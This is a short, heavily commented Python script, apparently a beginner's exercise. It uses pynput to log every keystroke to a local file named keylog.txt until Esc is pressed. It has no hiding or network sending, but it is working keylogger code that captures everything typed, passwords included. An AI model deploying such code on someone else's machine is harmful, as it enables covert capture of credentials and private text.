#This imports the "keyboard" module from the pynput library
from pynput import keyboard

#Creating a function that shows instructions on what each key should do
def on_press(key):

    #Opens the file and if it doesnt exists it creates it
    #Names the file f
    with open("keylog.txt", "a") as f:
        
        #Writes the specific keys that are done onto a file
        try:
            f.write(key.char)
        except AttributeError:

            #If the key isnt a character,number,special symbol etc
            #and meets the criteria it will do something specific
            #If it doesnt meet the criteria then it will continue as
            #normal
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                pass
            else:
                f.write(f"[{key}]")
                
#End the listening process without having to crash the program
def on_release(key):
    if key == keyboard.Key.esc:
        return False

#Creates a variable to contain the part that listens to your keyboard
#and calls the necessary functions when necessary
#It is contained in a variable to allow it to be controlled later on
listener = keyboard.Listener(on_press=on_press,on_release=on_release)

#Starts the listening process
listener.start()

#Keeps the listening process going and stopping it from instantly closing.
listener.join()


